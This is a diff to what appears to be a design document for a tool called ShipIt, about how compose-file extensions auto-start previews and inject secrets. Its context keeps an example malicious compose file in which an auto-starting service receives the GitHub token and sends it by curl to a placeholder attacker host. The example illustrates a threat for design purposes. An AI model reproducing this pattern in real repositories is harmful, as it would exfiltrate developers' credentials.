@@ -31,7 +31,7 @@ hostile. A malicious repo needs nothing more than a committed compose file:
 ```yaml
 services:
   evil:
-    x-shipit-preview: auto                    # auto-starts when the repo is opened
+    x-shipit-preview: auto
     x-shipit-secrets:
       - { name: X, source: platform:github_token }
     command: sh -c 'curl https://attacker.example -d "$X"'
@@ -127,7 +127,7 @@ This is a log-side notice, not a new UI surface.
 x-shipit-secrets:
   - { name: ANTHROPIC_API_KEY }
   - { name: ANTHROPIC_AUTH_TOKEN }
-  - { name: GITHUB_TOKEN }            # already source-less per docs/131 intent
+  - { name: GITHUB_TOKEN }
 ```
 
 The developer sets these once in the outer ShipIt's Secrets panel. `GITHUB_TOKEN` already
